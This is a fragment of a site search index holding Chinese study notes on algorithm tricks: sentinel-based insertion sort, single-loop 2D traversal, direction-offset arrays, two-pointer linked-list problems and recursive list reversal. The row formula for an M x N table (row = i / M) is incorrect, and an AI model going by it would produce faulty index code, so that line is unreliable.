2017.","title":"1.\u7b97\u6cd5\u8bbe\u8ba1\u4e2d\u7684\u5e38\u7528\u6280\u5de7"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/#_1","text":"","title":"\u7b97\u6cd5\u8bbe\u8ba1\u4e2d\u7684\u5e38\u7528\u6280\u5de7"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/#_2","text":"\u7b97\u6cd5\u8bbe\u8ba1\u4e2d\u7684\u5e38\u7528\u6280\u5de7 \u76ee\u5f55 1. \u80cc\u666f 2. \u54e8\u5175\u4f4d 3. \u4e00\u91cd\u5faa\u73af\u904d\u5386\u4e8c\u7ef4\u6570\u7ec4 4. \u68cb\u76d8\uff08\u8ff7\u5bab\uff09\u7c7b\u7b97\u6cd5\u65b9\u5411\u904d\u5386 5. \u5355\u94fe\u8868 5.1. \u5224\u65ad\u5355\u94fe\u8868\u662f\u5426\u6709\u73af 5.2. \u5355\u94fe\u8868\u9006\u5e8f 6. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/#1","text":"\u6700\u8fd1\u5b66\u4e60\u4e86\u4e00\u4e0bGitchat\u5728\u70ed\u63a8\u7684 \u300a\u7b97\u6cd5\u8bbe\u8ba1\u5b9e\u621850\u8bb2\u300b \u4e13\u680f\uff0c\u5728 \u57fa\u7840\u5f00\u80c3\u83dc \u8fd9\u4e00\u7ae0\uff0c\u738b\u6653\u534e\u8001\u5e08\u8bb2\u4e86\u4e00\u4e9b\u7b97\u6cd5\u8bbe\u8ba1\u7684\u5e38\u7528\u6280\u5de7\uff0c\u6211\u89c9\u5f97\u5f88\u6709\u610f\u601d\uff0c\u6240\u4ee5\u6458\u5f55\u4e86\u4e00\u90e8\u5206\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\u3002","title":"1. \u80cc\u666f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/#2","text":"\u8bbe\u7f6e\u54e8\u5175\u4f4d\u662f\u7a0b\u5e8f\u8bbe\u8ba1\u4e2d\u5e38\u7528\u7684\u6280\u5de7\u4e4b\u4e00\uff0c\u5e38\u7528\u5728\u7ebf\u6027\u8868\u7684\u5904\u7406\u8fc7\u7a0b\u4e2d\uff0c\u6bd4\u5982\u67e5\u627e\u548c\u79fb\u52a8\u6570\u636e\u64cd\u4f5c\u3002 \u54e8\u5175\u4f4d\u901a\u5e38\u8d77\u5230\u4e24\u4e2a\u4f5c\u7528\uff1a \u4f5c\u4e3a\u4e00\u4e2a\u4e34\u65f6\u5b58\u50a8\u7a7a\u95f4\u4f7f\u7528\uff0c \u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u8d8a\u754c\u5224\u65ad\uff0c\u7b80\u5316\u7b97\u6cd5\u4ee3\u7801\u590d\u6742\u5ea6\u3002 \u6bd4\u5982\u73af\u5f62\u94fe\u8868\u901a\u5e38\u4f1a\u8bbe\u7f6e\u4e00\u4e2a\u8868\u5934\u8282\u70b9\uff0c\u65e0\u8bba\u5411\u524d\u6216\u5411\u540e\u904d\u5386\uff0c\u5747\u4ee5\u8fd9\u4e2a\u8868\u5934\u8282\u70b9\u4e3a\u904d\u5386\u8d8a\u754c\uff08\u91cd\u590d\uff09\u7684\u4f9d\u636e\uff0c\u8fd9\u6837\u7ef4\u62a4\u94fe\u8868\u7684\u65f6\u5019\u5c31\u4e0d\u9700\u8981\u4e13\u95e8\u5b58\u50a8\u4e00\u4e2a\u8868\u5934\u6307\u9488\uff0c\u8fd9\u4e2a\u8868\u5934\u8282\u70b9\u53ef\u4ee5\u7406\u89e3\u4e3a\u54e8\u5175\u4f4d\u3002 \u63d2\u5165\u6392\u5e8f\u7b97\u6cd5\u4e2d\u4e5f\u4f1a\u5229\u7528\u8868\u4e2d\u7684 0 \u53f7\u4f4d\u7f6e\u4f5c\u4e3a\u54e8\u5175\u4f4d\u4f7f\u7528\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u4e0d\u4ec5\u8d77\u5230\u4e00\u4e2a\u4e34\u65f6\u5b58\u50a8\u7a7a\u95f4\u7684\u4f5c\u7528\uff0c\u8fd8\u53ef\u4ee5\u7b80\u5316\u63d2\u5165\u540e\u79fb\u52a8\u6570\u636e\u7684\u5224\u65ad\u6761\u4ef6\u3002 \u6ce8\u610f\u4e0b\u9762\u7684\u63d2\u5165\u6392\u5e8f\u4ee3\u7801\uff0c\u5185\u5c42 while \u5faa\u73af\u79fb\u52a8\u6570\u636e\u7684\u65f6\u5019\uff0c\u53ea\u9700\u5224\u65ad\u5f53\u524d\u4f4d\u7f6e\u7684\u6570\u662f\u5426\u6bd4 ls[0] \u4f4d\u7f6e\u5927\u5373\u53ef\uff0c\u4e0d\u9700\u8981\u5173\u5fc3 j \u7684\u4f4d\u7f6e\u662f\u5426\u5c0f\u4e8e 1 \u800c\u8d8a\u754c\uff0c\u56e0\u4e3a\u5f53 j=1 \u7684\u65f6\u5019\uff0c ls[j - 1] > ls[0] \u7684\u6761\u4ef6\u80af\u5b9a\u4e0d\u6ee1\u8db3\uff0c while \u5faa\u73af\u5c31\u4f1a\u7ec8\u6b62\u3002\u5982\u679c\u4e0d\u4f7f\u7528\u54e8\u5175\u4f4d\uff0c\u5185\u5c42\u79fb\u52a8\u6570\u636e\u7684\u5faa\u73af\u5904\u7406\u4ee3\u7801\u5c31\u9700\u8981\u589e\u52a0 j \u662f\u5426\u8d8a\u754c\u7684\u5224\u65ad\u3002 //\u5e26\u54e8\u5175\u4f4d\u7684\u63d2\u5165\u6392\u5e8f\uff0cls[0]\u662f\u54e8\u5175\u4f4d\uff0c\u6570\u636e\u4ece ls[1]\u5f00\u59cb\u5b58\u653e void insert_sort(int *ls, int n) { for (int i = 2; i <= n; ++i) { if (ls[i] < ls[i - 1]) { //i\u4f4d\u7f6e\u7684\u6570\u5b58\u5165\u54e8\u5175\u4f4d\uff0c\u56e0\u4e3a i \u4f4d\u7f6e\u4f1a\u88ab\u540e\u9762\u7684\u79fb\u52a8\u6570\u636e\u64cd\u4f5c\u8986\u76d6 ls[0] = ls[i]; int j = i; //\u4e0d\u7528\u518d\u5224\u65ad j \u662f\u5426\u8d8a\u754c\uff0c\u76f4\u63a5\u5224\u65ad\u5f53\u524d\u4f4d\u7f6e\u7684\u503c\u662f\u5426\u5927\u4e8e\u54e8\u5175\u4f4d while(ls[j - 1] > ls[0]) { ls[j] = ls[j - 1]; j--; } ls[j] = ls[0]; } } } \u548c\u4e0d\u4f7f\u7528\u54e8\u5175\u4f4d\u7684\u63d2\u5165\u6392\u5e8f\u8fdb\u884c\u5bf9\u6bd4 // \u5982\u679c\u4e0d\u4f7f\u7528\u54e8\u5175\u4f4d void insert_sort_mine(int* ls, int n){ for (int i = 2; i <= n; ++i) { if (ls[i] < ls[i - 1]) { //i\u4f4d\u7f6e\u7684\u6570\u5b58\u5165mark\uff0c\u56e0\u4e3a i \u4f4d\u7f6e\u4f1a\u88ab\u540e\u9762\u7684\u79fb\u52a8\u6570\u636e\u64cd\u4f5c\u8986\u76d6 int mark = ls[i]; int j; //\u5728\u5224\u65ad\u524d\u4e00\u4f4d\u662f\u5426\u5927\u4e8emark\u7684\u540c\u65f6\u8fd8\u9700\u8981\u5224\u65adj\u662f\u5426\u8d8a\u754c for (j = i; j > 1 && ls[j - 1] > mark; j--) { ls[j] = ls[j - 1]; } ls[j] = mark; } } } \u5728\u4e00\u4e9b\u67e5\u627e\u64cd\u4f5c\u4e2d\uff0c\u6709\u65f6\u5019\u4e5f\u4f1a\u7528\u5230\u54e8\u5175\u4f4d\uff0c\u6bd4\u5982\u8981\u67e5\u627e\u67d0\u4e2a\u503c\uff0c\u53ef\u4ee5\u5728\u8868\u4e2d\u9002\u5f53\u7684\u4f4d\u7f6e\u9884\u7f6e\u4e00\u4e2a\u7b49\u4e8e\u8fd9\u4e2a\u503c\u7684\u54e8\u5175\u4f4d\uff0c\u8fd9\u6837\u5728\u67e5\u627e\u8fc7\u7a0b\u4e2d\u5c31\u4e0d\u7528\u8003\u8651\u8fb9\u754c\u8d8a\u754c\uff0c\u4e5f\u4e0d\u7528\u8003\u8651\u627e\u4e0d\u5230\u7684\u60c5\u51b5\uff0c\u67e5\u627e\u904d\u5386\u7684\u7b97\u6cd5\u5b9e\u73b0\u5c31\u53ef\u4ee5\u5f88\u7b80\u6d01\uff0c\u53ea\u9700\u5728\u67e5\u627e\u7ed3\u675f\u7684\u65f6\u5019\uff0c\u5224\u65ad\u4e00\u4e0b\u7ed3\u679c\u662f\u5426\u662f\u54e8\u5175\u4f4d\uff0c\u5982\u679c\u662f\u54e8\u5175\u4f4d\uff0c\u5219\u8bf4\u660e\u6ca1\u6709\u627e\u5230\u3002","title":"2. \u54e8\u5175\u4f4d"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/#3","text":"\u4e8c\u7ef4\u8868\u7684\u904d\u5386\u4e00\u822c\u9700\u8981\u4e24\u91cd\u5faa\u73af\u6765\u5b9e\u73b0\uff0c\u4f46\u662f\u4e24\u91cd\u5faa\u73af\u7684\u4ee3\u7801\u4e0d\u5982\u4e00\u91cd\u5faa\u73af\u7684\u4ee3\u7801\u6e05\u723d\uff0c\u5f88\u591a\u60c5\u51b5\u4e0b\u7528\u4e00\u91cd\u5faa\u73af\u904d\u5386\u4e8c\u7ef4\u8868\u4e5f\u662f\u4e00\u79cd\u4e0d\u9519\u7684\u9009\u62e9\u3002\u7528\u4e00\u91cd\u5faa\u73af\u904d\u5386\u4e8c\u7ef4\u8868\u5173\u952e\u662f\u5bf9\u4e0b\u6807\u7684\u5904\u7406\uff0c\u5bf9\u4e8e\u4e00\u4e2a M \u00d7 N \u7684\u4e8c\u7ef4\u8868\uff0c\u53ef\u7528\u4ee5\u4e0b\u65b9\u6cd5\u89e3\u51fa\u5bf9\u5e94\u7684\u4e8c\u7ef4\u4e0b\u6807\uff1a int row = i / M int col = i % N \u53cd\u8fc7\u6765\uff0c\u4e5f\u53ef\u4ee5\u7528\u4ee5\u4e0b\u516c\u5f0f\u5c06\u4e8c\u7ef4\u5750\u6807\u8fd8\u539f\u4e3a\u4e00\u7ef4\u5750\u6807\uff1a int i = row * N + col \u5f88\u591a\u4e5d\u5bab\u683c\u7c7b\u578b\u7684\u6e38\u620f\u68cb\u76d8\u7684\u521d\u59cb\u5316\u5c31\u662f\u7528\u7684\u8fd9\u79cd\u65b9\u6cd5\u3002 for(int i = 0; i < 9; i++) { int row = i / 3; int col = i % 3; game->cells[row][col].fixed = false; }","title":"3. \u4e00\u91cd\u5faa\u73af\u904d\u5386\u4e8c\u7ef4\u6570\u7ec4"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/#4","text":"\u68cb\u76d8\u6216\u8ff7\u5bab\u7c7b\u6e38\u620f\u5e38\u5e38\u9700\u8981\u914d\u5408\u5404\u79cd\u641c\u7d22\u7b97\u6cd5\uff0c\u4e8c\u7ef4\u68cb\u76d8\u548c\u8ff7\u5bab\u7684\u641c\u7d22\u5e38\u5e38\u662f\u6cbf\u7740\u4e0e\u67d0\u4e2a\u4f4d\u7f6e\u76f8\u4e34\u7684 4 \u4e2a\u6216 8 \u4e2a\u65b9\u5411\u5c55\u5f00\uff0c\u5bf9\u8fd9\u4e9b\u65b9\u5411\u7684\u904d\u5386\u5c31\u662f\u641c\u7d22\u7b97\u6cd5\u7684\u4e3b\u8981\u7ed3\u6784\u3002\u6211\u5e38\u5e38\u770b\u5230\u4e00\u4e9b\u670b\u53cb\u7ed9\u51fa\u7684\u7b97\u6cd5\u7528\u4e86\u957f\u957f\u7684 if-else \u6216 switch-case \u8bed\u53e5\uff0c\u65e0\u975e\u662f\u8fd9\u6837\u7684\u7ed3\u6784\uff1a switch(direction) { case UP: \u2026\u2026 case DOWN: \u2026\u2026 case LEFT: \u2026\u2026 case RIGHT: \u2026\u2026 } \\text{Figure 1. \u65b9\u5411\u6570\u7ec4\u5750\u6807\u504f\u79fb\u5173\u7cfb} \u89c2\u5bdf\u6bcf\u4e00\u4e2a case \u5206\u652f\uff0c\u9664\u4e86\u6570\u7ec4\u4e0b\u6807\u8ba1\u7b97\u4e0d\u540c\uff0c\u5176\u4ed6\u4ee3\u7801\u90fd\u662f\u96f7\u540c\u7684\u91cd\u590d\u4ee3\u7801\uff0c\u5176\u5b9e\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6700\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u65b9\u5411\u504f\u79fb\u6570\u7ec4\uff0c\u7528\u4e00\u4e2a\u5faa\u73af\u5bf9\u8fd9\u4e2a\u65b9\u5411\u6570\u7ec4\u904d\u5386\u4e00\u904d\u5c31\u53ef\u5b8c\u6210\u5bf9\u5404\u4e2a\u65b9\u5411\u7684\u641c\u7d22\u3002\u4ee5\u4e8c\u7ef4\u6570\u7ec4\u5b9a\u4e49\u7684\u68cb\u76d8\u4e3a\u4f8b\uff0c\u5982\u679c\u4ece i \u884c j \u5217\u5f00\u59cb\u5411\u4e0a\u3001\u4e0b\u3001\u5de6\u3001\u53f3\u56db\u4e2a\u65b9\u5411\u641c\u7d22\uff0c\u5219\u8fd9\u56db\u4e2a\u65b9\u5411\u53ef\u8f6c\u6362\u4e3a\u4ee5\u4e0b\u884c\u3001\u5217\u5750\u6807\u5173\u7cfb\uff1a \u5411\u5de6\u641c\u7d22\uff1a\u884c\u5750\u6807 i \u4e0d\u53d8\uff0c\u5217\u5750\u6807 j-1 \u5411\u4e0a\u641c\u7d22\uff1a\u884c\u5750\u6807 i-1\uff0c\u5217\u5750\u6807\u4e0d\u53d8 \u5411\u53f3\u641c\u7d22\uff1a\u884c\u5750\u6807 i \u4e0d\u53d8\uff0c\u5217\u5750\u6807 j+1 \u5411\u4e0b\u641c\u7d22\uff1a\u884c\u5750\u6807 i+1\uff0c\u5217\u5750\u6807\u4e0d\u53d8 \u6839\u636e\u4ee5\u4e0a\u5173\u7cfb\uff0c\u9996\u5148\u5b9a\u4e49\u4e8c\u7ef4\u6570\u7ec4\u4e0b\u6807\u504f\u79fb\u91cf\uff0c\u7136\u540e\u5b9a\u4e49\u4e00\u4e2a\u504f\u79fb\u91cf\u6570\u7ec4\uff0c\u5206\u522b\u8868\u793a\u5411\u56db\u4e2a\u65b9\u5411\u7684\u6570\u7ec4\u4e0b\u6807\u504f\u79fb\u91cf\uff1a typedef struct { int x_off; int y_off; }OFFSET; OFFSET dir_offset[] = {{0,-1},{-1,0},{0,1},{1,0}}; \u5047\u8bbe\u5f53\u524d\u4f4d\u7f6e\u7684\u4e8c\u7ef4\u6570\u7ec4\u4e0b\u6807\u662f x\u3001y\uff0c\u5219\u5bf9\u6b64\u4f4d\u7f6e\u5f00\u59cb\u5411\u56db\u4e2a\u65b9\u5411\u641c\u7d22\u7684\u4ee3\u7801\u53ef\u4ee5\u5982\u6b64\u5b9e\u73b0\uff1a for(int i = 0; i < count_of(dir_offset); i++) { int new_x = x + dir_offset[i].x_off; int new_y = y + dir_offset[i].y_off; \u2026\u2026 } \u8fd9\u79cd\u7b97\u6cd5\u5b9e\u73b0\u907f\u514d\u4e86\u5bf9\u6bcf\u4e2a\u65b9\u5411\u90fd\u8fdb\u884c\u4e0b\u6807\u8ba1\u7b97\uff0c\u5373\u4fbf\u662f\u589e\u52a0\u4e24\u4e2a\u659c\u7ebf\u65b9\u5411\uff0c\u4ece 4 \u4e2a\u65b9\u5411\u641c\u7d22\u6269\u5c55\u5230 8 \u4e2a\u65b9\u5411\u641c\u7d22\uff0c\u53ea\u9700\u8c03\u6574 dir_offset \u6570\u7ec4\u5373\u53ef\uff0c\u6446\u8131\u4e86\u5197\u957f\u7684 switch-case \u4ee3\u7801\u7ed3\u6784\u3002\u300a\u7b97\u6cd5\u7684\u4e50\u8da3\u300b 1 \u7b2c 14 \u7ae0\u4ecb\u7ecd\u5149\u6805\u586b\u5145\u7b97\u6cd5\u65f6\u7528\u5230\u4e86\u65b9\u5411\u6570\u7ec4\uff0c\u7b2c 20 \u7ae0\u4ecb\u7ecd\u534e\u5bb9\u9053\u6e38\u620f\u65f6\u518d\u6b21\u4f7f\u7528\u4e86\u65b9\u5411\u6570\u7ec4\uff0c\u90fd\u662f\u7c7b\u4f3c\u60c5\u51b5\u4e0b\u5f88\u5178\u578b\u7684\u5e94\u7528\u3002","title":"4. \u68cb\u76d8\uff08\u8ff7\u5bab\uff09\u7c7b\u7b97\u6cd5\u65b9\u5411\u904d\u5386"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/#5","text":"","title":"5. \u5355\u94fe\u8868"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/#51","text":"\u5355\u94fe\u8868\u6709\u5f88\u591a\u6709\u610f\u601d\u7684\u95ee\u9898\uff0c\u6bd4\u5982\u201c\u5224\u65ad\u5355\u94fe\u8868\u662f\u5426\u6709\u73af\u201d\u3001\u201c\u5982\u4f55\u4e00\u6b21\u904d\u5386\u5c31\u627e\u5230\u94fe\u8868\u4e2d\u95f4\u4f4d\u7f6e\u8282\u70b9\u201d\u3001\u201c\u5355\u94fe\u8868\u4e2d\u5012\u6570\u7b2c k \u4e2a\u8282\u70b9\u201d\u7b49\u95ee\u9898\uff0c\u89e3\u51b3\u8fd9\u4e09\u4e2a\u95ee\u9898\u9700\u8981\u4f7f\u7528\u53cc\u6307\u9488\u7684\u6280\u5de7\uff0c\u6bd4\u5982\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u201c\u6162\u6307\u9488\u201d\u548c\u4e00\u4e2a\u201c\u5feb\u6307\u9488\u201d\uff0c\u4ece\u94fe\u8868\u5934\u5f00\u59cb\u904d\u5386\uff0c\u6162\u6307\u9488\u4e00\u6b21\u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u8282\u70b9\uff0c\u5feb\u6307\u9488\u4e00\u6b21\u79fb\u52a8\u4e24\u4e2a\u8282\u70b9\u3002\u5982\u679c\u94fe\u8868\u6ca1\u6709\u73af\uff0c\u5219\u5feb\u6307\u9488\u4f1a\u5148\u5230\u8fbe\u6700\u540e\u4e00\u4e2a\u8282\u70b9\uff08NULL\uff09\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u5feb\u6307\u9488\u4f1a\u8ffd\u4e0a\u6162\u6307\u9488\uff08\u76f8\u9047\uff09\u3002 \u7b2c\u4e8c\u4e2a\u95ee\u9898\u540c\u6837\u8bbe\u7f6e\u4e00\u5feb\u4e00\u6162\u4e24\u4e2a\u6307\u9488\uff0c\u6162\u6307\u9488\u4e00\u6b21\u79fb\u52a8\u4e00\u4e2a\u8282\u70b9\uff0c\u5feb\u6307\u9488\u4e00\u6b21\u79fb\u52a8\u4e24\u4e2a\u8282\u70b9\uff0c\u5f53\u5feb\u6307\u9488\u79fb\u52a8\u5230\u7ed3\u5c3e\u65f6\uff0c\u6162\u6307\u9488\u6307\u5411\u7684\u5c31\u662f\u4e2d\u95f4\u8282\u70b9\u3002\u7b2c\u4e09\u4e2a\u95ee\u9898\u4e5f\u662f\u53cc\u6307\u9488\uff0c\u5176\u4e2d\u4e00\u4e2a\u5148\u79fb\u52a8 k \u4e2a\u8282\u70b9\uff0c\u7136\u540e\u4e24\u4e2a\u6307\u9488\u4ee5\u76f8\u540c\u7684\u901f\u5ea6\u4e00\u8d77\u79fb\u52a8\uff0c\u5f53\u5148\u79fb\u52a8\u7684\u6307\u9488\u79fb\u52a8\u5230\u7ed3\u5c3e\u7684\u65f6\u5019\uff0c\u540e\u79fb\u52a8\u7684\u6307\u9488\u6307\u5411\u7684\u5c31\u662f\u5012\u6570\u7b2c k \u4e2a\u8282\u70b9\u3002","title":"5.1. \u5224\u65ad\u5355\u94fe\u8868\u662f\u5426\u6709\u73af"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/#52","text":"\u5355\u94fe\u8868\u8fd8\u6709\u4e00\u4e2a\u7ecf\u5e38\u88ab\u9762\u8bd5\u5230\u7684\u9898\u76ee\uff0c\u5c31\u662f\u5355\u94fe\u8868\u9006\u5e8f\u3002\u5f88\u591a\u516c\u53f8\u7684\u9762\u8bd5\u9898\u5e93\u4e2d\u90fd\u6709\u8fd9\u9053\u9898\uff0c\u6709\u7684\u516c\u53f8\u660e\u786e\u9898\u76ee\u8981\u6c42\u4e0d\u80fd\u4f7f\u7528\u989d\u5916\u7684\u8282\u70b9\u5b58\u50a8\u7a7a\u95f4\uff0c\u6709\u7684\u6ca1\u6709\u660e\u786e\u8bf4\u660e\uff0c\u4f46\u662f\u5982\u679c\u9762\u8bd5\u8005\u4f7f\u7528\u4e86\u989d\u5916\u7684\u8282\u70b9\u5b58\u50a8\u7a7a\u95f4\u505a\u4e2d\u8f6c\uff0c\u4f1a\u5f97\u5230\u4e00\u4e2a\u6bd4\u8f83\u4f4e\u7684\u5206\u6570\u3002\u4e0d\u4f7f\u7528\u989d\u5916\u5b58\u50a8\u8282\u70b9\u7684\u60c5\u51b5\u4e0b\u4f7f\u4e00\u4e2a\u5355\u94fe\u8868\u7684\u6240\u6709\u8282\u70b9\u9006\u5e8f\u53ef\u4ee5\u91c7\u7528\u9012\u5f52\u7684\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u91c7\u7528\u5faa\u73af\u8fed\u4ee3\u7684\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u53ea\u4ecb\u7ecd\u9012\u5f52\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u8fd9\u79cd\u65b9\u6cd5\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u7b97\u6cd5\u4ee3\u7801\u7684\u5b9e\u73b0\u4e5f\u5f88\u7b80\u5355\u3002 \\text{Figure 2. \u5355\u94fe\u8868\u9006\u5e8f\u9012\u5f52\u72b6\u6001\u56fe} \u9012\u5f52\u65b9\u6cd5\u7684\u6838\u5fc3\u5c31\u662f\u786e\u5b9a\u9012\u5f52\u5b50\u95ee\u9898\uff0c\u94fe\u8868\u7c7b\u7684\u95ee\u9898\u627e\u9012\u5f52\u5b50\u95ee\u9898\u7684\u65b9\u6cd5\u57fa\u672c\u56fa\u5b9a\uff0c\u5c31\u662f\u6bcf\u6b21\u9664\u53bb\u94fe\u8868\u5934\u90e8\u7b2c\u4e00\u4e2a\u8282\u70b9\uff0c\u5269\u4e0b\u7684\u5e8f\u5217\u4f5c\u4e3a\u5206\u89e3\u7684\u5b50\u95ee\u9898\u3002\u4e3b\u8981\u7684\u7b97\u6cd5\u5b9e\u73b0\u601d\u8def\u662f\u5148\u5c06\u5f53\u524d\u7684\u8868\u5934\u8282\u70b9\u4ece\u94fe\u8868\u4e2d\u62c6\u51fa\u6765\uff0c\u7136\u540e\u5bf9\u5269\u4f59\u7684\u8282\u70b9\u7ec4\u6210\u7684\u5b50\u94fe\u8868\u8fdb\u884c\u9006\u5e8f\uff0c\u6700\u540e\u5c06\u5f53\u524d\u7684\u8868\u5934\u8282\u70b9\u8fde\u63a5\u5230\u65b0\u94fe\u8868\u7684\u5c3e\u90e8\u3002 \u5982\u56fe\uff082\uff09\u6240\u793a\uff0c\u6bcf\u4e00\u8f6e\u9012\u5f52\u90fd\u662f\u5148\u5bf9\u5b50\u94fe\u8868\u9006\u5e8f\uff0c\u7136\u540e\u5c06\u62c6\u51fa\u6765\u7684 head \u8282\u70b9\u9644\u52a0\u5230\u65b0\u7684\u5b50\u94fe\u8868\u7684\u5c3e\u90e8\u3002\u867d\u7136\u9012\u5f52\u8c03\u7528\u7684\u987a\u5e8f\u662f\u4ece a \u5230 c \u7684\u987a\u5e8f\uff0c\u4f46\u662f\u9012\u5f52\u9006\u5e8f\u7684\u5b9e\u9645\u64cd\u4f5c\u8fc7\u7a0b\u9700\u8981\u4ece c \u5230 a \u53cd\u7740\u6765\u7406\u89e3\u3002\u56fe\uff082-c\uff09\u5c31\u662f\u9012\u5f52\u7b26\u5408\u9000\u51fa\u6761\u4ef6\u65f6\u7684\u72b6\u6001\uff0c\u6b64\u65f6\u5b50\u94fe\u8868\u53ea\u5269\u4e00\u4e2a\u8282\u70b9\uff0c\u76f4\u63a5\u8fd4\u56de\u8fd9\u4e2a\u8282\u70b9\u4f5c\u4e3a\u5b50\u94fe\u8868\u7684 new_head \u8282\u70b9\u3002\u968f\u540e\u7684\u9012\u5f52\u64cd\u4f5c\u5c06\u5b50\u94fe\u8868\u7684 head \u8282\u70b9\u9644\u52a0\u5230 new_head \u8282\u70b9\u7684\u5c3e\u90e8\uff0c\u5982\u4ee3\u7801\u6240\u793a\uff1a LINK_NODE *reverse_link(LINK_NODE *head) { LINK_NODE *newHead; if ((head == nullptr) || (head->next == nullptr)) return head; newHead = reverse_link(head->next); /*\u9012\u5f52\u9006\u8f6c\u5b50\u94fe\u8868\u90e8\u5206*/ head->next->next = head; /*\u56de\u6714\u90e8\u5206*/ head->next = nullptr; return newHead; } \u8fd9\u6bb5\u4ee3\u7801\u7684\u5173\u952e\u70b9\u662f\u5934\u8282\u70b9 head \u7684\u4e0b\u4e00\u4e2a\u8282\u70b9 head \\to next \u5c06\u662f\u9006\u5e8f\u540e\u7684\u65b0\u94fe\u8868\u7684\u5c3e\u8282\u70b9\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u88ab\u6458\u9664\u7684\u5934\u63a5\u70b9 head \u9700\u8981\u88ab\u94fe\u63a5\u5230 head \\to next \u624d\u80fd\u5b8c\u6210\u6574\u4e2a\u94fe\u8868\u7684\u9006\u5e8f\u3002 \u738b\u6653\u534e\u8001\u5e08\u7684 \u300a\u7b97\u6cd5\u8bbe\u8ba1\u5b9e\u621850\u8bb2\u300b \u4e13\u680f\u4e2d\u8fd8\u8bb2\u4e86\u5f88\u591a\u5176\u4ed6\u6709\u610f\u601d\u7684\u5185\u5bb9\uff0c\u611f\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u5728GitChat\u641c\u7d22\u8fd9\u4e2a\u4e13\u680f\u8ba2\u8d2d\u3002","title":"5.2. \u5355\u94fe\u8868\u9006\u5e8f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/#6","text":"[1] \u738b\u6653\u534e. \u7b97\u6cd5\u7684\u4e50\u8da3. \u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e, 2017.","title":"6. \u53c2\u8003\u6587\u732e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/","text":"\u5f52\u5e76\u6392\u5e8f # \u76ee\u5f55 # 